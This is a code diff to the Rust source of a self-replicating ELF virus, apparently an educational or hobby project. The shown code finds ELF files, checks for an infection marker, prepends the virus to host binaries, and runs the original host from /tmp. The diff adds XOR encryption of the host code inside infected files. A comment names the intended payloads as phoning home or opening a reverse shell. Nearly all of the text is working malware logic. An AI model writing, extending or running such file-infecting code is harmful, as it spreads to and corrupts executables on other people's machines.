@@ -15,17 +15,33 @@ const ELF_MAGIC: [u8; 4] = [0x7f, 0x45, 0x4c, 0x46];
 const INFECTION_MARK: [u8; 5] = [0x22, 0x33, 0x44, 0x55, 0x66];
 
 // We need to know the size in order to determine where our virus code ends and original binary code begins
-const VIRUS_SIZE: u64 = 3_294_408;
+const VIRUS_SIZE: u64 = 3_349_864;
 
-fn get_file_size(path: &OsStr) -> Result<u64, Box<dyn Error>> {
-    Ok(fs::metadata(&path)?.len())
-}
+// Will use to encrypt/decrypt host binary using XOR '^' operation
+const XOR_KEY: [u8; 8] = [0x12, 0x22, 0x32, 0x42, 0xAA, 0xAB, 0xAC, 0xF2];
+
 
 fn is_elf(path: &OsStr) -> Result<bool, Box<dyn Error>> {
     let mut magic = [0; 4];
+
+    // Read exactly four bytes from start of file
     File::open(path)?.read_exact(&mut magic)?;
 
+    // Do the four bytes match what we expect from a typical ELF binary (i.e., does the magic string match?)
     Ok(magic == ELF_MAGIC)
+}
+
+fn xor_enc_dec(input: Vec<u8>) -> Vec<u8> {
+    // Loop through entire input and perform XOR (exclusive-OR) operation on each byte
+    // Modulus '%' allows us to wrap the computed index within XOR_KEY range, so we never go out of bounds
+    // since modulus arithmetric says computed index must be between 0 and XOR_KEY.len() - 1
+    // a % b = c where c has possible answer range (0 through b-1)
+
+    input
+        .iter()
+        .enumerate()
+        .map(|(index, element)| element ^ XOR_KEY[index % XOR_KEY.len()])
+        .collect()
 }
 
 fn payload() {
@@ -34,7 +50,7 @@ fn payload() {
 }
 
 fn is_infected(path: &OsStr) -> Result<bool, Box<dyn Error>> {
-    let file_size = get_file_size(path)? as usize;
+    let file_size = fs::metadata(&path)?.len() as usize;
     let buf = fs::read(path)?;
 
     // Iterate through entire binary, looking for location of first element of INFECTION_MARK array
@@ -84,8 +100,11 @@ fn infect(virus: &OsString, target: &OsStr) -> Result<(), Box<dyn Error>> {
     // Write virus code to file first
     infected.write_all(&virus_buf)?;
 
-    // Write original binary code after
-    infected.write_all(&host_buf)?;
+    // XOR-encrypt contents of binary we're infecting
+    let encrypted_host_buf = xor_enc_dec(host_buf);
+
+    // Write encrypted binary code after virus
+    infected.write_all(&encrypted_host_buf)?;
 
     Ok(())
 }
@@ -109,8 +128,13 @@ fn run_infected_host(path: &OsString) -> Result<(), Box<dyn Error>> {
         infected.seek(SeekFrom::Start(VIRUS_SIZE))?;
         infected.read_to_end(&mut host_buf)?;
 
+        // Store decrypted, original binary code
+        println!("[*] Decrypting original binary code and writing to {}", tmp_host_path);
+        let decrypted_host_buf = xor_enc_dec(host_buf);
+
         // Write out only the original code to this new file at /tmp/host
-        plain_host_exe.write_all(&host_buf)?;
+        // This will be the decrypted, original ELF binary code
+        plain_host_exe.write_all(&decrypted_host_buf)?;
 
         println!("[*] I've stripped out the virus code successfully!")
     }
@@ -128,12 +152,13 @@ fn run_infected_host(path: &OsString) -> Result<(), Box<dyn Error>> {
     Ok(())
 }
 
+
 fn main() -> Result<(), Box<dyn Error>> {
 
     // Get filename of binary that's being executed (could be virus, could be infected file)
     let myself = OsString::from(env::args().nth(0).unwrap());
 
-    println!("Binary size: {}", get_file_size(&myself)?);
+    println!("Binary size: {}", fs::metadata(&myself)?.len());
 
     // Get current directory
     let current_dir = env::current_dir()?;
@@ -170,7 +195,7 @@ fn main() -> Result<(), Box<dyn Error>> {
 
     // Here we check to see effectively if we're executing as the virus or as an infected file
     // If total file size is greater than the virus size, we can assume we're running in an infected file
-    if get_file_size(&myself)? > VIRUS_SIZE {
+    if fs::metadata(&myself)?.len() > VIRUS_SIZE {
         println!("[*] Running virus payload below");
 
         // Let's run whatever payload we want (e.g., phone home, open reverse shell, etc.)
